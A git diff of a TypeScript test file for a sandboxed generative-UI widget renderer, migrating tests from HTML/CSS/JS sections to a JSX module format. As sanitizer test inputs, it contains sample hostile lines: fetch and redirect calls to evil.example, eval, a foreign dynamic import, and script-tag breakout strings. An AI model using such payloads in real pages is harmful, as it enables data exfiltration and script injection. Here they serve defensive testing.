@@ -7,7 +7,6 @@ import {
   withGenerativeUiSegmentIds,
   hasWidgetBody,
 } from "../web/src/indirect-code/components/generative-ui/dsl";
-import { processPartialHtml } from "../web/src/indirect-code/components/generative-ui/process-partial-html";
 import {
   clampFrameHeight,
   MIN_FRAME_HEIGHT,
@@ -19,39 +18,36 @@ import {
   escapeStyleClose,
   sanitizeModelJS,
   widgetCSP,
-  widgetNetCSP,
   buildRuntimeScript,
-  buildModelScript,
+  buildJsxImportMap,
+  buildJsxModuleBody,
   buildWidgetDocument,
   makeScriptNonce,
 } from "../web/src/indirect-code/components/generative-ui/widget-doc";
 
 describe("parseGenerativeUiDsl", () => {
-  test("parses headers and sections", () => {
+  test("parses headers and the @jsx source body", () => {
     const body = [
       "placeholder: Building your savings projection",
-      "height: 360",
       `state: {"amount": 1000, "years": 5}`,
       "",
-      "@html",
-      '<div class="gu-root">hi</div>',
-      "@css",
-      ".gu-root { padding: 8px; }",
-      "@js",
-      "const el = document.getElementById('x');",
+      "@jsx",
+      'import { useState } from "react";',
+      "export default function App() { return <div className=\"gu-root\">hi</div>; }",
     ].join("\n");
     const d = parseGenerativeUiDsl(body);
     expect(d.placeholder).toBe("Building your savings projection");
-    expect(d.height).toBe(360);
     expect(d.state).toEqual({ amount: 1000, years: 5 });
-    expect(d.html).toBe('<div class="gu-root">hi</div>');
-    expect(d.css).toBe(".gu-root { padding: 8px; }");
-    expect(d.js).toBe("const el = document.getElementById('x');");
+    expect(d.jsx).toContain('import { useState } from "react";');
+    expect(d.jsx).toContain('return <div className="gu-root">hi</div>;');
   });
 
-  test("content before any section is html", () => {
-    const d = parseGenerativeUiDsl("<div>direct</div>");
-    expect(d.html).toBe("<div>direct</div>");
+  test("the @jsx body is verbatim — later lines are never re-parsed", () => {
+    const d = parseGenerativeUiDsl(
+      ["@jsx", "const s = 1;", "placeholder: not a header", "@html", "const t = 2;"].join("\n"),
+    );
+    expect(d.jsx).toBe("const s = 1;\nplaceholder: not a header\n@html\nconst t = 2;");
+    expect(d.placeholder).toBeUndefined();
   });
 
   test("partial state JSON during streaming is dropped safely", () => {
@@ -59,41 +55,36 @@ describe("parseGenerativeUiDsl", () => {
     expect(d.state).toBeUndefined();
   });
 
-  test("streams partial html (no closing fence yet)", () => {
-    const d = parseGenerativeUiDsl("@html\n<div class=\"gu-root\"><h2 class=\"gu-ti");
-    expect(d.html).toContain('<div class="gu-root">');
+  test("streams partial source (no closing fence yet)", () => {
+    const d = parseGenerativeUiDsl('@jsx\nexport default function App() { return <div class="gu-ro');
+    expect(d.jsx).toContain('<div class="gu-ro');
+    expect(hasWidgetBody(d)).toBe(true);
+    expect(hasWidgetBody({})).toBe(false);
+  });
+
+  test("@tsx is accepted as a silent alias of @jsx (source is always TSX)", () => {
+    const d = parseGenerativeUiDsl("@tsx\nexport default function App() { return <div />; }");
+    expect(d.jsx).toContain("export default function App");
     expect(hasWidgetBody(d)).toBe(true);
   });
 
-  test("accepts @javascript and @script aliases", () => {
-    const d = parseGenerativeUiDsl("@javascript\nalert(1);");
-    expect(d.js).toBe("alert(1);");
-  });
-
-  test("parses the net header", () => {
-    expect(parseGenerativeUiDsl("net: true\n@html\n<div></div>").net).toBe(true);
-    expect(parseGenerativeUiDsl("net: yes\n@html\n<div></div>").net).toBe(true);
-    expect(parseGenerativeUiDsl("net: false\n@html\n<div></div>").net).toBe(false);
-    expect(parseGenerativeUiDsl("@html\n<div></div>").net).toBeUndefined();
-    expect(parseGenerativeUiDsl("libs: map\nnet: true\n@html\n<div></div>").libs).toEqual(["map"]);
-  });
 
   test("parses the libs header (whitelist, dedupe, order)", () => {
-    expect(parseGenerativeUiDsl("libs: d3, three\n@html\n<div></div>").libs)
+    expect(parseGenerativeUiDsl("libs: d3, three\n@jsx\nconst a = 1;").libs)
       .toEqual(["d3", "three"]);
-    expect(parseGenerativeUiDsl("libs: three d3 three\n@html\n<div></div>").libs)
+    expect(parseGenerativeUiDsl("libs: three d3 three\n@jsx\nconst a = 1;").libs)
       .toEqual(["three", "d3"]);
-    expect(parseGenerativeUiDsl("libs: evil, d3\n@html\n<div></div>").libs)
+    expect(parseGenerativeUiDsl("libs: evil, d3\n@jsx\nconst a = 1;").libs)
       .toEqual(["d3"]);
-    expect(parseGenerativeUiDsl("@html\n<div></div>").libs).toBeUndefined();
-    expect(parseGenerativeUiDsl("libs: gsap, chart\n@html\n<div></div>").libs)
+    expect(parseGenerativeUiDsl("@jsx\nconst a = 1;").libs).toBeUndefined();
+    expect(parseGenerativeUiDsl("libs: gsap, chart\n@jsx\nconst a = 1;").libs)
       .toEqual(["gsap", "chart"]);
   });
 
-  test("unknown header keys are ignored as html content? no — key: value lines stay header-ish", () => {
-    const d = parseGenerativeUiDsl("color: red\n@html\n<div></div>");
-    // Unknown `key: value` before any section does not crash the parser.
-    expect(d.html).toContain("<div></div>");
+  test("unknown header keys do not crash the parser", () => {
+    const d = parseGenerativeUiDsl("color: red\n@jsx\nconst a = 1;");
+    expect(d.jsx).toContain("const a = 1;");
+    expect(d.placeholder).toBeUndefined();
   });
 });
 
@@ -104,8 +95,8 @@ describe("splitGenerativeUiSegments", () => {
       "",
       "```generative_ui",
       "placeholder: My widget",
-      "@html",
-      "<div>x</div>",
+      "@jsx",
+      "export default function App() { return <div>x</div>; }",
       "```",
       "",
       "And the conclusion.",
@@ -128,47 +119,24 @@ describe("splitGenerativeUiSegments", () => {
   });
 
   test("open fence at stream end becomes an unclosed widget segment", () => {
-    const text = "before\n\n```generative_ui\nplaceholder: Loading thing\n@html\n<div class=\"gu-ro";
+    const text = "before\n\n```generative_ui\nplaceholder: Loading thing\n@jsx\nexport default function App() { return <div class=\"gu-ro";
     const segs = splitGenerativeUiSegments(text);
     const widget = segs.find((s) => s.kind === "widget");
     expect(widget).toBeTruthy();
     expect(widget!.kind === "widget" && widget!.closed).toBe(false);
-    expect(widget!.kind === "widget" && widget!.body).toContain("@html");
+    expect(widget!.kind === "widget" && widget!.body).toContain("@jsx");
   });
 
   test("genui alias works", () => {
-    const segs = splitGenerativeUiSegments("```genui\n@html\n<div></div>\n```");
+    const segs = splitGenerativeUiSegments("```genui\n@jsx\nconst a = 1;\n```");
     expect(segs[0].kind).toBe("widget");
   });
 
   test("longer fence (4 ticks) closes correctly", () => {
-    const segs = splitGenerativeUiSegments("````generative_ui\n@html\n<div></div>\n````\ndone");
+    const segs = splitGenerativeUiSegments("````generative_ui\n@jsx\nconst a = 1;\n````\ndone");
     expect(segs[0].kind).toBe("widget");
     expect(segs[0].kind === "widget" && segs[0].closed).toBe(true);
     expect(segs[1].kind === "md" && segs[1].text).toBe("done");
-  });
-});
-
-describe("processPartialHtml", () => {
-  test("closes unclosed tags", () => {
-    expect(processPartialHtml('<div class="a"><span>he')).toBe('<div class="a"><span>he</span></div>');
-  });
-
-  test("trims an incomplete trailing tag", () => {
-    expect(processPartialHtml("<div>ok</div><sec")).toBe("<div>ok</div>");
-    expect(processPartialHtml("<div>ok</div><section cla")).toBe("<div>ok</div>");
-  });
-
-  test("keeps void elements unclosed", () => {
-    expect(processPartialHtml('<img src="x"><br>')).toBe('<img src="x"><br>');
-  });
-
-  test("nested tags close in reverse order", () => {
-    expect(processPartialHtml("<ul><li><b>x")).toBe("<ul><li><b>x</b></li></ul>");
-  });
-
-  test("handles self-closing custom elements", () => {
-    expect(processPartialHtml("<my-el /><div>")).toBe("<my-el /><div></div>");
   });
 });
 
@@ -191,17 +159,17 @@ describe("widget document sanitizers", () => {
       .not.toMatch(/<\s*\/?\s*script/i);
   });
 
-  test("escapeStyleClose neutralizes style closers", () => {
+  test("escapeStyleClose neutralizes style closers (lib css)", () => {
     expect(escapeStyleClose(".a{}</style><script>x</script>"))
       .not.toMatch(/<\s*\/\s*style/i);
   });
 
-  test("sanitizeModelJS strips forbidden capabilities", () => {
+  test("sanitizeModelJS strips forbidden capabilities but keeps ESM", () => {
     const js = [
+      "import { a } from 'b';",
       "const x = 1;",
       "fetch('https://evil.example');",
       "location.href = 'https://evil.example';",
-      "import { a } from 'b';",
       "eval('1+1');",
       "new Function('return 1');",
       "document.getElementById('a').textContent = 'ok';",
@@ -209,7 +177,10 @@ describe("widget document sanitizers", () => {
     const clean = sanitizeModelJS(js);
     expect(clean).toContain("const x = 1;");
     expect(clean).toContain("textContent = 'ok'");
-    for (const bad of ["fetch(", "location.href", "import {", "eval(", "new Function("]) {
+    // Static imports are the widget module format — validated at compile
+    // time against the import map, never stripped here.
+    expect(clean).toContain("import { a } from 'b';");
+    for (const bad of ["fetch(", "location.href", "eval(", "new Function("]) {
       expect(clean).not.toContain(bad);
     }
   });
@@ -218,13 +189,15 @@ describe("widget document sanitizers", () => {
     const esm = 'import("https://esm.sh/canvas-confetti@1").then((m) => m.default());';
     const other = 'import("https://evil.example/x.js").then(() => {});';
     const statik = 'import confetti from "https://esm.sh/canvas-confetti@1";';
-    // Default (offline widget): every import form is stripped.
-    expect(sanitizeModelJS(esm)).not.toContain("esm.sh");
-    // Net widget: only the literal esm.sh dynamic import survives.
-    const clean = sanitizeModelJS([esm, other, statik].join("\n"), { allowEsmSh: true });
+    // The literal esm.sh dynamic import always survives (the one allowed
+    // lib CDN; a static import of a URL is a compile error, caught earlier
+    // by jsx-compile).
+    const clean = sanitizeModelJS([esm, other, statik].join("\n"));
     expect(clean).toContain(esm);
     expect(clean).not.toContain("evil.example");
-    expect(clean).not.toContain("import confetti");
+    // Static imports are kept (the module format) — only dynamic foreign
+    // imports are stripped.
+    expect(clean).toContain("import confetti");
   });
 
   test("buildRuntimeScript wraps model js in a try/catch", () => {
@@ -235,61 +208,80 @@ describe("widget document sanitizers", () => {
     expect(script).toContain("pagehide");
   });
 
-  test("buildModelScript splices the body and registers a destroy hook", () => {
-    const script = buildModelScript("doStuff(); return { destroy() {} };");
-    expect(script).toContain("doStuff(); return { destroy() {} };");
-    expect(script).toContain("$onDestroy(__result.destroy)");
-    expect(script).toContain("reportError");
-    // No eval: the sandbox CSP has no 'unsafe-eval'.
-    expect(script).not.toContain("eval(");
+  test("buildJsxModuleBody appends the auto-mount to the compiled ESM", () => {
+    const body = buildJsxModuleBody("export default function App() {}");
+    expect(body).toContain("export default function App() {}");
+    expect(body).toContain("window.ReactDOMClient.createRoot(document.body)");
+    expect(body).toContain("window.React.createElement(__app");
+    // No eval and no CJS leftovers: the sandbox CSP has no 'unsafe-eval'.
+    expect(body).not.toContain("eval(");
+    expect(body).not.toContain("require(");
+    expect(body).not.toContain("module.exports");
   });
 
-  test("widget CSP is locked down: sandboxed, images-only network, nonce scripts", () => {
+  test("buildJsxImportMap resolves the react surface and the vendored libs", () => {
+    const map = JSON.parse(buildJsxImportMap({
+      react: "/api/indirect-code/gen-ui/lib/react-shim.js",
+      libs: { d3: "/api/indirect-code/gen-ui/lib/d3.js" },
+    }));
+    expect(map.imports).toEqual({
+      react: "/api/indirect-code/gen-ui/lib/react-shim.js",
+      "react/jsx-runtime": "/api/indirect-code/gen-ui/lib/react-shim.js",
+      "react/jsx-dev-runtime": "/api/indirect-code/gen-ui/lib/react-shim.js",
+      "react-dom": "/api/indirect-code/gen-ui/lib/react-shim.js",
+      "react-dom/client": "/api/indirect-code/gen-ui/lib/react-shim.js",
+      d3: "/api/indirect-code/gen-ui/lib/d3.js",
+    });
+  });
+
+  test("widget CSP is locked down: sandboxed, network limited to data + esm.sh", () => {
     const csp = widgetCSP("abc");
     expect(csp).toContain("sandbox allow-scripts");
     expect(csp).toContain("default-src 'none'");
     expect(csp).toContain("script-src 'nonce-abc'");
-    expect(csp).toContain("connect-src 'none'");
-    expect(csp).toContain("frame-ancestors 'self'");
-    // Images may load from any http(s) site; scripts stay strictly nonce'd.
-    expect(csp).toContain("img-src data: blob: https: http:");
-    expect(csp).not.toContain("esm.sh");
-    const scriptSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("script-src")) || "";
-    expect(scriptSrc).not.toContain("unsafe-inline");
-    expect(scriptSrc).not.toContain("unsafe-eval");
-  });
-
-  test("net widget CSP opens https data and esm.sh scripts only", () => {
-    const csp = widgetNetCSP("abc");
-    expect(csp).toContain("img-src data: blob: https: http:");
+    // The served widget modules (lib + stored module) are the only script
+    // sources besides the nonce and the one allowed lib CDN (esm.sh).
+    expect(csp).toContain("/api/indirect-code/gen-ui/lib/");
+    expect(csp).toContain("/api/indirect-code/gen-ui/modules/");
+    expect(csp).toContain("https://esm.sh");
+    // fetch/XHR/WebSocket lines are stripped from model code
+    // (sanitizeModelJS); https connects cover the esm.sh module graph and
+    // map data. No wildcard origins anywhere.
     expect(csp).toContain("connect-src https:");
-    expect(csp).toContain("script-src 'nonce-abc' https://esm.sh");
-    const scriptSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("script-src")) || "";
+    expect(csp).not.toContain("connect-src *");
+    expect(csp).toContain("frame-ancestors 'self'");
+    // Images may load from any http(s) site.
+    expect(csp).toContain("img-src data: blob: https: http:");
+    const scriptSrc = csp.split(";").map((s: string) => s.trim()).find((s: string) => s.startsWith("script-src")) || "";
     expect(scriptSrc).not.toContain("unsafe-inline");
     expect(scriptSrc).not.toContain("unsafe-eval");
   });
 
-  test("buildWidgetDocument never lets model css/js break out of its element", () => {
+  test("buildWidgetDocument keeps every inline script nonce'd and model-free", () => {
     const doc = buildWidgetDocument({
       theme: "dark",
-      html: "<div class=\"gu-root\">x</div>",
-      css: ".a{}</style><script>window.evil=1</script><style>",
+      moduleUrl: "/api/indirect-code/gen-ui/modules/abc",
+      importMap: buildJsxImportMap({ react: "/api/indirect-code/gen-ui/lib/react-shim.js", libs: {} }),
       stateJSON: "{}",
-      js: "window.pwned=1;</script><script>window.pwned2=1",
-      initialHeight: 320,
       scriptNonce: makeScriptNonce(),
     });
-    // The only <script> elements outside <style> text are nonce'd
-    // (runtime + model wrapper); model CSS text can mention <script> but is
-    // trapped inside its style element.
+    // The model lives in the served module: the document only carries the
+    // runtime, the bridge and the module reference.
+    expect(doc).toContain('<script type="module" src="/api/indirect-code/gen-ui/modules/abc"');
+    // Every inline script (runtime + bridge + import map) is nonce'd; the
+    // module reference is external (src=).
     const outsideStyles = doc.replace(/<style>[\s\S]*?<\/style>/g, "");
-    const scripts = outsideStyles.match(/<script\b/g) || [];
-    const nonces = outsideStyles.match(/<script nonce=/g) || [];
-    expect(scripts.length).toBe(nonces.length);
-    // runtime + model script
-    expect(scripts.length).toBe(2);
-    expect(doc).not.toMatch(/<\/style><script>window\.evil/);
-    expect(doc).not.toMatch(/<\/script><script>window\.pwned2/);
+    const inline = (outsideStyles.match(/<script\b[^>]*>/g) || []).filter((t) => !t.includes("src="));
+    const nonces = outsideStyles.match(/<script[^>]*nonce=/g) || [];
+    expect(inline.length).toBe(nonces.length);
+    // runtime + bridge + import map
+    expect(inline.length).toBe(3);
+  });
+
+  test("buildJsxModuleBody never lets model code close its element", () => {
+    const body = buildJsxModuleBody('var s = "</script><script>window.evil=1</script>";');
+    expect(body).not.toContain("</script>");
+    expect(body).toContain("<\\/script");
   });
 });
 
@@ -352,8 +344,8 @@ describe("streaming segment stability (no per-token remount)", () => {
     "",
     "```generative_ui",
     "placeholder: Building your savings projection",
-    "@html",
-    '<div class="gu-root"><h2 class="gu-title">Hi</h2></div>',
+    "@jsx",
+    'export default function App() { return <div className="gu-root">Hi</div>; }',
     "```",
     "",
     "Adjust the slider to explore.",
